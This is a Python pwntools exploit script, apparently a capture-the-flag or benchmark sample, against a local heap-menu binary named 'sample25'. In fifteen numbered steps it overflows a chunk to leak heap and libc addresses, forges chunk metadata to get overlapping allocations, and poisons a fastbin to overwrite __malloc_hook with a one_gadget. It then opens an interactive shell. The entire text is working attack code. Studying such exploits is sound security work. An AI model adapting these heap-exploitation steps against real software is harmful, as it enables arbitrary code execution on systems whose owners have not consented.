from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample25')
elf = ELF('./data/sample25')
libc = elf.libc

def create(ID,size):
    p.sendline(b'1')
    p.sendline(str(ID).encode('utf-8'))
    p.sendline(str(size).encode('utf-8'))

def show(ID):
    p.sendline(b'2')
    p.sendline(str(ID).encode('utf-8'))

def dele(ID):
    p.sendline(b'3')
    p.sendline(str(ID).encode('utf-8'))

def edit(ID,content):
    p.sendline(b'4')
    p.sendline(str(ID).encode('utf-8'))
    p.sendline(content)

create(6,0x10);create(7,0x20);create(8,0x20);create(9,0x40);dele(8);dele(7)#step.1
payload = b'a'*0x1f;edit(6,payload)#step.2
show(6);p.recvuntil(b'to show?Content:');p.recvline();chunk_addr = p.recvline()[:-1];chunk_addr = int.from_bytes(chunk_addr,'little');chunk_addr = chunk_addr - 0x50#step.3
create(0,0x10);create(1,0xf8);create(2,0x10);create(3,0xf8);create(4,0x40)#step.4
chunk1_addr = chunk_addr + 0x20+0x30+0x30+0x50+0x20;payload = b'a'*0x10+p64(0x120)+p64(0x100);edit(2,payload)#step.5
create(5,0x40)#step.6
payload = b'a'*0x10+p64(0)+p64(0x121)+p64(chunk1_addr)+p64(chunk1_addr);edit(0,payload)#step.7
dele(3)#step.8
create(1,0xf8)#step.9
show(2);p.recvuntil(b'to show?Content: ');main_area = p.recvline()[:-1];main_area = int.from_bytes(main_area,'little')#step.10
create(10,0x68);dele(10)#step.11
libc_addr = main_area - 88 - 0x10 - libc.sym['__malloc_hook'];malloc_hook = libc_addr+libc.sym['__malloc_hook'];fake_chunk = malloc_hook - 0x23;edit(2,p64(fake_chunk))#step.12
create(11,0x68);create(13,0x68)#step.13
ogg = libc_addr + 0x4526a+6;realloc_hook = libc_addr+libc.sym["realloc"];edit(13,b'a'*3+p64(0)+p64(ogg)+p64(realloc_hook+16))#step.14
create(14,20)#step.15
p.interactive()